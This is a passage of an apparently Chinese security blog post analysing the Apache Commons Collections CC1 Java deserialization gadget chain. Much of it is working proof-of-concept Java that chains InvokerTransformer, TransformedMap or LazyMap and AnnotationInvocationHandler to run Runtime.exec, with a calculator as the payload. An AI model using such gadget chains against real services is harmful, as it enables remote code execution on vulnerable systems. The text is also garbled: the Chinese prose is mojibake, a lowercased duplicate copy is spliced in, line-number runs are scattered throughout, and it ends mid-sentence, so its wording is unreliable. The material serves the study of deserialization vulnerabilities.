çç±»åä»£çç±»åå«å»å®ç°è¿ä¸ªæ¥å£ãç¶ååå»ºä»£çç±»çå¯¹è±¡ï¼è°ç¨ä»£çç±»ä¸­å®ç°çæ¹æ³ï¼å¨ä»£çç±»æ¹æ³ä¸­åè°ç¨å®éçæ¹æ³ãä»£ç æ¼ç¤ºå¦ä¸ï¼\n\n// æ¥å£\npackage com.pwddd.proxy;\n\npublic interface IUser {\n  void show();\n\n  void eat();\n\n  void run();\n}\n\n\n// å·ä½å®ç°\npackage com.pwddd.proxy;\n\npublic class UserImpl implements IUser{\n  @Override\n  public void show() {\n    System.out.println("userImpl .... show");\n  }\n\n  @Override\n  public void eat() {\n    System.out.println("userImpl .... eat");\n  }\n\n  @Override\n  public void run() {\n    System.out.println("userImpl .... run");\n  }\n}\n\n// ä»£çå®ç°\npackage com.pwddd.proxy;\n\npublic class UserProxy implements IUser{\n\n  private UserImpl user;\n\n  public UserProxy() {\n  }\n\n  public UserProxy(UserImpl user) {\n    this.user = user;\n  }\n\n  @Override\n  public void show() {\n    System.out.println("proxy show");\n    user.show();\n  }\n\n  @Override\n  public void eat() {\n    System.out.println("proxy show");\n    user.eat();\n  }\n\n  @Override\n  public void run() {\n    System.out.println("proxy show");\n    user.run();\n  }\n}\n\n\n// æµè¯æ¹æ³\npackage com.pwddd.proxy;\n\npublic class ProxyTest {\n  public static void main(String[] args) {\n    UserProxy userProxy = new UserProxy(new UserImpl());\n    userProxy.show();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\néè¿éæä»£ççæ¹å¼ï¼å½æä»¬æ³è¦è°ç¨showæ¹æ³æ¶ï¼å®éä¸è°ç¨çæ¯ä»£çç±»çshowæ¹æ³ï¼å¨ä»£çç±»ä¸­åç¸åºçå¤çæä½åï¼å¨è°ç¨å®éçæ¹æ³ãè¿ç§éæä»£ççå¼ç«¯å°±æ¯å½éè¦ä»£ççç±»çæ¹æ³ä¿®æ¹æ¶ï¼å¯¹åºçå·ä½å®ç°åä»£çç±»åéè¦è¢«ä¿®æ¹æè½æ­£å¸¸ä½¿ç¨ã\n\nä¸é¢ä»ç»ä¸ç§å¨æ¡æ¶ä¸­å¤§éä½¿ç¨çå¨æä»£çã\n\n\n# å¨æä»£ç\n\néæä»£ççç±»å¨ç¨åºè¿è¡ä¹åå°±è¿è¡äºç¼è¯ãèå¨æä»£çå¹¶ä¸æ¯å¨Javaä»£ç ä¸­å®ä¹çï¼èæ¯å¨è¿è¡æ¶åå»ºä»£çç±»çå¯¹è±¡ãç¸æ¯äºéæä»£çï¼ å¨æä»£ççä¼å¿å¨äºå¯ä»¥å¾æ¹ä¾¿çå¯¹ä»£çç±»çå½æ°è¿è¡ç»ä¸çå¤çï¼èä¸ç¨ä¿®æ¹æ¯ä¸ªä»£çç±»ä¸­çæ¹æ³ã\n\nå¨javaçjava.lang.reflectåä¸æä¾äºä¸ä¸ªProxyç±»åä¸ä¸ªInvocationHandleræ¥å£ï¼éè¿è¿ä¸ªç±»åè¿ä¸ªæ¥å£å¯ä»¥çæJDKå¨æä»£çç±»åå¨æä»£çå¯¹è±¡ã\n\nåå»ºä¸ä¸ªæ§è¡å¤çå¨ç±»å®ç°InvocationHandleræ¥å£ã\n\npackage com.pwddd.proxy.dynamic;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\n\npublic class MyInvocationHandler<T> implements InvocationHandler {\n\n  T target;\n\n  public MyInvocationHandler() {\n  }\n\n  public MyInvocationHandler(T target) {\n    this.target = target;\n  }\n\n  @Override\n  public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n    System.out.println(method.getName()+"------------------");\n    Object object = method.invoke(target, args);\n\n    return object;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nåå»ºæµè¯å¨æä»£ç\n\npackage com.pwddd.proxy.dynamic;\n\nimport com.pwddd.proxy.staticproxy.IUser;\nimport com.pwddd.proxy.staticproxy.UserImpl;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\n\npublic class TestDynamicProxy {\n  public static void main(String[] args) {\n    IUser user = new UserImpl();\n    InvocationHandler handler = new MyInvocationHandler<>(user);\n\n    IUser userProxy = (IUser) Proxy.newProxyInstance(\n      user.getClass().getClassLoader(),\n      user.getClass().getInterfaces(),\n      handler);\n    userProxy.eat();\n\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\næä»¬é¦ååå»ºäºä¸ä¸ªInvocationHandlerç±»ï¼å¹¶ä¸å¨è¯¥ç±»çæé æ¹æ³ä¸­ä¼ éè¿å»æä»¬è¦ä»£ççå·ä½ç±»çå¯¹è±¡ãéåinvokeæ¹æ³ï¼å¨è¯¥æ¹æ³ä¸­æ·»å ä»£ççæ¹æ³ï¼å¹¶å©ç¨åå°è°ç¨å®éç±»çæ¹æ³ãä½¿ç¨Proxy.newProxyInstanceåå»ºä»£çç±»çå¯¹è±¡ï¼ä½¿ç¨ä»£çç±»å¯¹è±¡è°ç¨æ¹æ³ã\n\n\n# YsoserialçCC1\n\n\n# LazyMap\n\næä»¬å¨ä¸é¢è¯´å°ï¼ysoserialçCC1ä½¿ç¨çæ¯LazyMapï¼èæä»¬æå»ºçé¾ä½¿ç¨çæ¯TransformedMapï¼è¿ä¸¤èå¨åªäºå°æ¹æåºå«å¢ï¼æä»¬æ¥ä¸æ¥å°±æ¥çä¸ä¸ã\n\næä»¬å¯ä»¥çå°ï¼LazyMapå¨getæ¹æ³ä¸­è°ç¨äºtransformæ¹æ³ï¼å æ­¤æä»¬å¯ä»¥å°è¯æé ä»¥ä¸ä»£ç ï¼æµè¯æ¯å¦è½å¤æ§è¡ç³»ç»å½ä»¤ã\n\nTransformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer("getMethod", \n                           new Class[]{String.class,Class[].class}, \n                           new Object[]{"getRuntime",new Class[0]}),\n    new InvokerTransformer("invoke", \n                           new Class[]{Object.class,Object[].class}, \n                           new Object[]{null, new Object[0]}),\n    new InvokerTransformer("exec", \n                           new Class[]{String.class},\n                           new String[]{"calc"}),\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nHashMap<Object, Object> innerMap = new HashMap<>();\ninnerMap.put("value", "test");\nMap outerMap = LazyMap.decorate(innerMap, chainedTransformer);\nouterMap.get(Runtime.getRuntime());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nç»è¿æµè¯ï¼åç°æ¯å¯ä»¥è¿è¡å½ä»¤æ§è¡çï¼é£ä¹å°±éè¦ç»§ç»­å¾ä¸å¯»æ¾ï¼åªéè°ç¨è¿setæ¹æ³ãæç»å¨AnnotationInvokerHandlerä¸­çinvokeæ¹æ³ä¸­æ¾å°äºè°ç¨ï¼\n\npublic Object invoke(Object proxy, Method method, Object[] args) {\n    String member = method.getName();\n    Class<?>[] paramTypes = method.getParameterTypes();\n\n    // Handle Object and Annotation methods\n    if (member.equals("equals") && paramTypes.length == 1 &&\n        paramTypes[0] == Object.class)\n        return equalsImpl(args[0]);\n    if (paramTypes.length != 0)\n        throw new AssertionError("Too many parameters for an annotation method");\n\n    switch(member) {\n        case "toString":\n            return toStringImpl();\n        case "hashCode":\n            return hashCodeImpl();\n        case "annotationType":\n            return type;\n    }\n\n    // Handle annotation member accessors\n    Object result = memberValues.get(member);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nä½æ¯éæ¾çæ¯ï¼å¨AnnotationInvokerHandlerçreadObjectæ¹æ³ä¸­å¹¶æ²¡æè°ç¨è¿invokeæ¹æ³ãé£ä¹ysoserialæä¾çæ¹æ³æ¯ä½¿ç¨å¨æä»£çï¼è¿æ ·çè¯å¦æè°ç¨äºreadObjectæ¹æ³ï¼å¹¶ä¸å¨readObjectæ¹æ³ä¸­è°ç¨äºå¯¹è±¡çä»»ææ¹æ³ï¼å°±ä¼è§¦åä»£çç±»çinvokeæ¹æ³ï¼å¯¼è´å½ä»¤æ§è¡ã\n\nå®æ´çLazyMap CC1é¾å¦ä¸ï¼\n\nTransformer[] transformers = new Transformer[]{\n  new ConstantTransformer(Runtime.class),\n  new InvokerTransformer(\n    "getMethod",\n    new Class[]{String.class,Class[].class},\n    new Object[]{"getRuntime",new Class[0]}\n  ),\n\n  new InvokerTransformer(\n    "invoke",\n    new Class[]{Object.class,Object[].class},\n    new Object[]{null,new Object[0]}\n  ),\n\n  new InvokerTransformer(\n    "exec",\n    new Class[]{String.class},\n    new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n  )\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nHashMap innerMap = new HashMap();\ninnerMap.put("value","xxx");\nMap outerMap = LazyMap.decorate(innerMap,chainedTransformer);\n\nClass clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\nConstructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);\nconstructor.setAccessible(true);\nInvocationHandler instance = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);\n\nMap proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, instance);\ninstance = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# ä¸¤ä¸ªå°ç»è\n\nå¨è¿è¡ä¸è¿°pocçæ¶åï¼å¯è½ä¼åºç°åæ¶æå¼å¤ä¸ªè®¡ç®å¨ãè¿ç§é®é¢çåå æ¯æä»¬çæäºä»£çç±»çå¯¹è±¡ï¼é£ä¹å½æ¯æ¬¡è¢«ä»£çç±»çæ¹æ³è¢«è°ç¨æ¶ï¼é½ä¼æ§è¡ä»£çç±»çinvokeæ¹æ³ï¼ä»èå¯¼è´å¼¹åºè®¡ç®å¨ãysoserialä¸ºäºé¿åè¿ä¸ªé®é¢ï¼ç¹æå°transformersæ°ç»æåææ¾ç½®å°transformerchainsä¸­ã\n\n\n\nå¦å¤ä¸ä¸ªå°±æ¯ysoserialçTransformeræ°ç»å¨æç»æ·»å äºä¸ä¸ªConstantTransformer(1)ãæ ¹æ®Pç¥å¨Javaå®å¨æ¼«è°ä¸­çè§£éï¼æ¯ä¸ºäºéèå¼å¸¸æ¥å¿ä¸­çä¸äºä¿¡æ¯ãæä»¬è¿éä¸åæ·±ç©¶ã\n\n\n# åèèµæ\n\nä»£ç å®¡è®¡ç¥è¯æç - Javaå®å¨æ¼«è°ï¼https://wx.zsxq.com/dweb2/index/group/2212251881\n\nç½æ¥æ¢¦ç»é¿ Bilibili ï¼ https://space.bilibili.com/2142877265',normalizedContent:'# cc1å©ç¨é¾åæ\n\n\n\ncc1é¾æ¯commonscollectionsçç¬¬ä¸æ¡gadget chainï¼ä¹æ¯javaååºååçå¼ç¯ã\n\n\n# èæ¯\n\napache commons collectionsæ¯ä¸ä¸ªæ©å±äºjavaæ ååºéçcollectionç»æçç¬¬ä¸æ¹åºç¡åºãå¨ä¼ä¸é¡¹ç®åå¸¸è§çä¸­é´ä»¶ä¸­ä½¿ç¨ååçå¹¿æ³ãå¹¶ä¸ç±äºå®æ¯éåç±»çä¸ä¸ªæå±ï¼å æ­¤åéåç±»ä¼¼ï¼ä»çåæ°å¾å¾æ¯objectç±»åï¼ååçæ¹ä¾¿æå»ºååºååå©ç¨é¾ã2015å¹´ï¼foxglove securityå¢éåç°å¹¶åè¡¨äºå©ç¨commons collectionsè¿è¡ååºååå¯¼è´è¿ç¨å½ä»¤æ§è¡çé¿ç¯åå®¢ï¼ç±æ­¤ä¹å¼èµ·äºå½åå¤å®å¨äººåå¯¹äºjavaååºååæ¼æ´çéè§åç ç©¶ãcommonscollections1ä½ä¸ºjavaååºååå©ç¨é¾ä¸­æåºç¡çé¾ï¼ææ¸æ¥è¿æ¡é¾çå©ç¨è¿ç¨ååçï¼å¯¹äºæ·±å¥äºè§£ååºååæ¼æ´åç ç©¶å¶ä»å©ç¨é¾æå¾å¤§çå¸®å©ã\n\n\n# å¤ç°ç¯å¢\n\njdkçæ¬ï¼jdk8u65\n\ncommonscollections : <= 3.2.1\n\nsunæºç ä¸è½½å°åï¼http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4\n\n> æ³¨ï¼ å ä¸ºå¨jdkçæºç ä¸­ä¸åå«sunåä¸çæºç ï¼æä»¬è¿è¡æç´¢æ¶æ¾ä¸å°sunåä¸çæºç ãå æ­¤éè¦å°sunçæºç æ·»å å°jdkç®å½ä¸çsrc.zipä¸­ã\n\n\n# åæ\n\næ ¹æ®foxglove securityçåå®¢ï¼cc1é¾è½å¤æåå©ç¨æ¯å ä¸ºå¨transformer(æ¥å£)çå®ç°ç±»invokertransformerä¸­çtransformæ¹æ³ä¸­ä½¿ç¨åå°è¿è¡è¿è¡ç±»çåå»ºåæ¹æ³çè°ç¨ï¼å¹¶ä¸æä»¬å¯ä»¥æ§å¶è°ç¨æ¹æ³çåç§°ãåæ°åä¼ å¥çç±»çå¯¹è±¡ãå¦ä¸ä»£ç æç¤ºï¼\n\npublic object transform(object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        class cls = input.getclass();\n        method method = cls.getmethod(imethodname, iparamtypes);\n        return method.invoke(input, iargs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\né£ä¹æä»¬å°±ä»è¿éå¥æï¼ä¸æ­¥ä¸æ­¥åæ¨å°å©ç¨é¾çå¼å§ä½ç½®ï¼readobject\n\n\n# javaæ§è¡å½ä»¤\n\nå¨javaä¸­æä¸ç§æ§è¡ç³»ç»å½ä»¤çæ¹å¼ï¼åå«æ¯runtime.getruntime.execãprocessbuilderåprocessimplãprocessimplæ¹å¼æ¯åä¸¤ç§æ¹å¼çåºå±å®ç°ï¼å¹¶ä¸æä¾ç»ç¨æ·è°ç¨ï¼ä½æ¯æä»¬å¯ä»¥å©ç¨åå°æ¥è°ç¨æ§è¡ç³»ç»çå½ä»¤ãå¨è¿ç¯æç« ä¸­å°±ä½¿ç¨æç®åçruntimeæ¥æ§è¡å½ä»¤ã\n\nå¨æ­£å¸¸æåµä¸ï¼æä»¬ä½¿ç¨å¦ä¸çå½ä»¤æ¥æ§è¡å½ä»¤ï¼\n\nruntime.getruntime().exec("calc");\n\n\n1\n\n\nè¿éä½¿ç¨runtimeçéææ¹æ³getruntimeæ¹æ³è·åå°ä¸ä¸ªruntimeå¯¹è±¡ï¼ç¶åè°ç¨execæ¹æ³ï¼æ§è¡execæ¹æ³ä¸­çå½ä»¤ï¼æå¼ä¸ä¸ªè®¡ç®å¨ãä¹æä»¥ä¸ç¨newç´æ¥åå»ºå¯¹è±¡ï¼åruntimeçåä¾æ¨¡å¼æå³ç³»ãå¨runtimeç±»ä¸­ï¼æé å¨ä¸ºç§æçï¼åªæä¾äºä¸ä¸ªgetruntimeæ¹æ³è·åå¯¹è±¡ãå½ç¶æä»¬ä¹å¯ä»¥ä½¿ç¨åå°æ¥åå»ºå¯¹è±¡ï¼è¿éå°±ä¸åè¯´æäºã\n\nç±äºæä»¬éè¦å©ç¨transformæ¹æ³ä¸­çåå°æ¥æ§è¡ç³»ç»å½ä»¤ï¼å æ­¤æä»¬å°ä¸é¢çåæ³ç¨javaåå°å®ç°ï¼\n\nclass<runtime> clazz = runtime.class;\nmethod getruntimemethod = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntimemethod.invoke(null, null);\nmethod execmethod = clazz.getmethod("exec", string.class);\nexecmethod.invoke(runtime,"calc");\n\n\n1\n2\n3\n4\n5\n\n\nå·ä½ä¸ºä»ä¹è¦è¿ä¹åï¼å¨å¦ä¸ç¯ãjavaååºåå - åå°ãçæç« ä¸­æè¯´æï¼è¿éä¸å¨ä»ç»ã\n\n\n# ä½¿ç¨invokertransformeræ§è¡å½ä»¤\n\npublic object transform(object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        class cls = input.getclass();\n        method method = cls.getmethod(imethodname, iparamtypes);\n        return method.invoke(input, iargs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨invokertransformerç±»çtransformæ¹æ³ä¸­ï¼inputæ¯æä»¬ä¼ å¥çæ³è¦åå°çç±»ï¼éè¿getclassè·åå°ç±»å¯¹è±¡ãç¶åè°ç¨getmethodæ¹æ³ï¼ä¼ å¥æ¹æ³åç§°ãåæ°ç±»åï¼æåè°ç¨æ¹æ³çinvokeï¼ä¼ å¥æ§è¡æ¹æ³çå¯¹è±¡ãæ¹æ³çåæ°æ§è¡è¯¥æ¹æ³ãå¶ä¸­æ¹æ³åç§°ãåæ°ç±»åãåæ°åå¯ä»¥å¨åå»ºinvokertransformerå¯¹è±¡æ¶ï¼ä½¿ç¨æé å¨è®¾ç½®ãå¯¹ç§ä¸é¢æä»¬èªå·±ç¼åçåå°æ§è¡ç³»ç»å½ä»¤çåæ³ï¼æä»¬ç¥éinputæ¯runtimeçå¯¹è±¡ï¼imethodnameæ¯execï¼iparamtypesæ¯string.classï¼iargsæ¯calcãäºæ¯æä»¬å°±æäºå¦ä¸çåæ³ï¼\n\ninvokertransformer invokertransformer = new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"});\nclass clazz = runtime.class;\nmethod getruntime = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntime.invoke(null);\ninvokertransformer.transform(runtime);\n\n\n1\n2\n3\n4\n5\n\n\n\n# è§£å³runtimeä¸å¯åºååçé®é¢\n\næ³è¦åºååä¸ä¸ªç±»ï¼éè¦è¿ä¸ªç±»å®ç°serializableæ¥å£ï¼runtimeæ²¡æå®ç°è¯¥æ¥å£ï¼å æ­¤æ æ³è¿è¡åºååï¼æç»å¯¼è´æ æ³è¿è¡å½ä»¤æ§è¡ãå æ­¤ï¼æä»¬éè¦å¯¹runtimeçåæ³è¿è¡æ¹é ï¼\n\nclass<runtime> clazz = runtime.class;\nmethod runtimemethod = (method) new invokertransformer(\n    "getmethod",\n    new class[]{string.class,class[].class},\n    new object[]{"getruntime",null})\n    .transform(clazz);\nruntime runtime =(runtime) new invokertransformer(\n    "invoke",\n    new class[]{object.class, object[].class},\n    new object[]{null,null})\n    .transform(runtimemethod);\nnew invokertransformer("exec",new class[]{string.class},new object[]{"calc"}).transform(runtime);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä¼ å¥çclassç±»å¯¹è±¡æ¯å¯ä»¥è¢«ååºååçï¼å æ­¤ä¼ å¥runtimeçç±»å¯¹è±¡ï¼å©ç¨åå°è°ç¨ç±»å¯¹è±¡çgetmethodæ¹æ³ï¼è·åå°è¯¥æ¹æ³ä¹åï¼å¨å©ç¨åå°è°ç¨getruntimeæ¹æ³å¯¹è±¡çinvokeæ¹æ³ï¼è·åå°runtimeå¯¹è±¡ãæåå¨å©ç¨invokertransformerè°ç¨execæ¹æ³ï¼è°ç¨ç³»ç»å½ä»¤ãè¿ç§æ¹æ³ååå·§å¦çè§£å³äºruntimeå¯¹è±¡æ æ³åºååçé®é¢ï¼è¿ç§åæ³å¨åç»­çååºååé¾ä¸­ä¹ååå¸¸è§ã\n\n\n# åè£chainedtransformer\n\næä»¬ä¸é¢çåæ³åå»ºäºä¸ä¸ªinvokertransformerå¯¹è±¡ï¼éè¦æ¯ä¸ªé½æ§è¡ä»çtransformæ¹æ³ï¼è¿æ ·è¿äºéº»ç¦ãtransformeræ¥å£è¿æä¸ä¸ªå®ç°ç±»chainedtransformerï¼è¯¥ç±»å¯ä»¥å°transformerå¯¹è±¡æ°ç»åè£æä¸ä¸ªchainedtransformerï¼è°ç¨transformæ¹æ³æ¶ï¼ä¼é¾å¼è°ç¨æ¯ä¸ªtransformerå¯¹è±¡çtransformæ¹æ³ãå¦ä¸å¾æç¤ºï¼\n\n\n\nå æ­¤ï¼å¯¹æä»¬ç¼åçä»£ç è¿è¡åè£ï¼ç¶åè°ç¨transformæ¹æ³ï¼æ§è¡çç»æåä¸é¢ä¸è´ï¼\n\ntransformer[] transformers = new transformer[]{\n    new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n    new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n    new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\nchainedtransformer.transform(runtime.class);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå°è¿ä¹åï¼æä»¬åºæ¬çtransformerå°±ç®æå»ºå®æäºï¼æä»¬éè¦ç½ä¸å¯»æ¾åªéè°ç¨è¿transformæ¹æ³ã\n\n\n# åä¸å¯»æ¾\n\nå¯ä»¥å©ç¨ideaçfind usagesæ¾å°ç°æçjavaæºç ä¸­è°ç¨è¿è¯¥æ¹æ³çä½ç½®ï¼è¿ä¹æ¯ä¸ºä»ä¹æä»¬éè¦å°sunåä¸çæºç æ¾å¥jdkç®å½ä¸çsrc.zipä¸­ãå¦ææ²¡æsunçæºç ï¼åé¢è¿æ¡é¾å°±ä¼æ­æã\n\n\n\nå¨æ¥æ¾çç»æä¸­ï¼æä»¬åç°org.apache.commons.collections.map.transformedmapç±»ä¸çchecksetvalueæ¹æ³çvaluetransformerå¯¹è±¡è°ç¨äºtransformæ¹æ³ã\n\nprotected object checksetvalue(object value) {\n    return valuetransformer.transform(value);\n}\n\n\n1\n2\n3\n\n\nèvaluetransformerå¯¹è±¡æ¯æä»¬å¯ä»¥æ§å¶çãä¹å°±æ¯è¯´ï¼å¦ævaluetransformerå¯¹è±¡æ¯æä»¬åå»ºçchainedtransformerå¯¹è±¡ï¼è°ç¨transformæ¹æ³å°±å¯ä»¥æ§è¡ç³»ç»å½ä»¤äºãæä»¬åæ¥çä¸ä¸valuetransformerä»åªéæ¥çã\n\nprotected transformedmap(map map, transformer keytransformer, transformer valuetransformer) {\n    super(map);\n    this.keytransformer = keytransformer;\n    this.valuetransformer = valuetransformer;\n}\n\n\n1\n2\n3\n4\n5\n\n\nå¨è¿ä¸ªç±»çæé å¨ä¸­ï¼valuetransformeræ¯ç±æä»¬ä¼ å¥çï¼é£ä¹æä»¬æ¯ä¸æ¯å°±å¯ä»¥è°ç¨æé å¨ç´æ¥æchainedtransformerçå¼èµå¼ç»valuetransformerå¢ï¼æ¯ä¸è¡çï¼å ä¸ºè¿ä¸ªæé å¨æ¯protectedçï¼æä»¬æ²¡æåæ³ç´æ¥è¿è¡è°ç¨ãé£ä¹æä»¬å°±çä¸çï¼æ¯è°è°ç¨äºè¿ä¸ªæé å¨ã\n\næä»¬æ¾å°ï¼å¨è¿ä¸ªç±»ä¸­å­å¨ä¸ä¸ªpublic çéææ¹æ³ï¼å¯ä»¥ä½¿ç¨ç±»åç´æ¥è°ç¨ï¼decorateãæä»¬ä¼ å¥è¯¥æ¹æ³çvaluetransformeråæ°ï¼å°ç´æ¥å¸¦å¥å°æé å¨ä¸­ã\n\npublic static map decorate(map map, transformer keytransformer, transformer valuetransformer) {\n    return new transformedmap(map, keytransformer, valuetransformer);\n}\n\n\n1\n2\n3\n\n\näºæ¯æä»¬å¯ä»¥è¿æ ·è¿è¡æå»ºï¼\n\nhashmap<object, object> map = new hashmap<>();\nmap.put("aaa","bbb");\nmap<object,object> decoratedmap = transformedmap.decorate(map, null, chainedtransformer);\n\n\n1\n2\n3\n\n\nè¿æ ·æä»¬å°±å°decoratedmapå¯¹è±¡ä¸­çchainedtransformerå¯¹è±¡èµå¼ä¸ºäºchainedtransformerãå½chainedtransformerè°ç¨transformæ¹æ³ï¼å®éä¸å°±æ¯chainedtransformerè°ç¨transformæ¹æ³ï¼å°±ä¼å¼¹åºè®¡ç®å¨ã\n\näºæ¯æä»¬ç»§ç»­åä¸æ¾ï¼åªéè°ç¨äºchecksetvalueæ¹æ³ã\n\nå¨org.apache.commons.collections.map.transformedmapç±»çç¶ç±»ä¸­æä¸ä¸ªéæåé¨ç±»ï¼å½æä»¬ä½¿ç¨foreachå¾ªç¯éåmapçentityå¹¶ç»entityè®¾ç½®å¼æ¶ä¼è°ç¨checksetvalueæ¹æ³ãsetvalueçåæ°æ¯objectç±»åçå¯¹è±¡ï¼è¯¥å¼ä¼ä¼ éç»checksetvalueæ¹æ³ï¼æåä¼ éç»transformæ¹æ³ã\n\nstatic class mapentry extends abstractmapentrydecorator {\n\n    /** the parent map */\n    private final abstractinputcheckedmapdecorator parent;\n\n    protected mapentry(map.entry entry, abstractinputcheckedmapdecorator parent) {\n        super(entry);\n        this.parent = parent;\n    }\n\n    public object setvalue(object value) {\n        value = parent.checksetvalue(value);\n        return entry.setvalue(value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\näºæ¯æä»¬å¯ä»¥è¿æ ·æé ï¼éåè£é¥°è¿çchainedtransformerå¯¹è±¡ãå¹¶ä¸è°ç¨setvalueæ¹æ³ãå°±å¯ä»¥è°ç¨å°tansfromæ¹æ³ã\n\nfor (map.entry entry : decoratedmap.entryset()){\n    entry.setvalue(runtime.class);\n}\n\n\n1\n2\n3\n\n\nè³æ­¤ï¼æä»¬å·²ç»å®æäºå¤§é¨åçå©ç¨é¾çå¯»æ¾ï¼ä¸ä¸æ­¥å°±æ¯å¯»æ¾åªéè°ç¨è¿setvalueï¼å¹¶ä¸å¯ä»¥æ§å¶ä¼ å¥çåæ°ãæå¥½æ¯readobjectè°ç¨è¿ï¼è¿æ ·å¨è¿è¡ååºååçæ¶åå°±å¯ä»¥ç´æ¥æ¿æ´»æ´æ¡å©ç¨é¾äºã\n\næä»¬ä¾ç¶ä½¿ç¨ideaçfind usageså¯»æ¾ï¼æç»å¨sunåä¸çsun.reflect.annotation.annotationinvocationhandlerçreadobjectæ¹æ³ä¸­è°ç¨äºsetvalueæ¹æ³ã\n\nprivate void readobject(java.io.objectinputstream s)\n    throws java.io.ioexception, classnotfoundexception {\n    s.defaultreadobject();\n\n    // check to make sure that types have not evolved incompatibly\n\n    annotationtype annotationtype = null;\n    try {\n        annotationtype = annotationtype.getinstance(type);\n    } catch(illegalargumentexception e) {\n        // class is no longer an annotation type; time to punch out\n        throw new java.io.invalidobjectexception("non-annotation type in annotation serial stream");\n    }\n\n    map<string, class<?>> membertypes = annotationtype.membertypes();\n\n    // if there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (map.entry<string, object> membervalue : membervalues.entryset()) {\n        string name = membervalue.getkey();\n        class<?> membertype = membertypes.get(name);\n        if (membertype != null) {  // i.e. member still exists\n            object value = membervalue.getvalue();\n            if (!(membertype.isinstance(value) ||\n                  value instanceof exceptionproxy)) {\n                membervalue.setvalue(\n                    new annotationtypemismatchexceptionproxy(\n                        value.getclass() + "[" + value + "]").setmember(\n                        annotationtype.members().get(name)));\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¶ä¸­çmembervaluesæ¯å¯ä»¥éè¿æé æ¹æ³ä¼ éè¿å»çãä½æ¯annotationinvocationhandlerç±»å¹¶épublicï¼ä¹æ æ³ç´æ¥è·åå¯¹è±¡ï¼æä»¬éè¦ä½¿ç¨åå°è·åå°è¯¥ç±»çå¯¹è±¡ãå¨æé å¨ä¸­ä¼ å¥ä¸ä¸ªæ³¨è§£ç±»åçç±»å¯¹è±¡ï¼åæä»¬ä¸é¢æé çdecoratedmapï¼å¨ååºååçæ¶åå°±ä¼è°ç¨è¯¥ç±»çreadobjectæ¹æ³ï¼éådecoratedmapï¼è°ç¨setvalueã\n\nclass<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\nconstructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\ndeclaredconstructor.setaccessible(true);\nobject o = declaredconstructor.newinstance(overide.class, decoratedmap);\n\ndeserialize(o,"test.ser");\nobject serialize = serialize("test.ser");\nsystem.out.println(serialize);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä½æ¯æä¸¤ç¹éè¦æ³¨æçæ¯ï¼\n\n 1. å½ifå¤æ­éè¿åæè½æ§è¡\n 2. setvalueçå¼æä»¬å¹¶ä¸å¯æ§ï¼å¹¶ä¸è½ä¼ å¥runtime.class\n\næä»¬åçä¸ä¸ifå¤æ­çé®é¢ï¼ifå¤æ­membertypeä¸ç­äºnullæ¶æç»§ç»­æ§è¡ãmembertypeçå¼çè·åæ¹å¼æ¯:\n\n1. è·åæä»¬ä¼ å¥çmapçkey -- è¿éæ¯ aaa\n2. ç¶åè·åæä»¬ä¼ å¥çæ³¨è§£ç±»çååå¼ --- overrideä¸­æ²¡æåæ° å 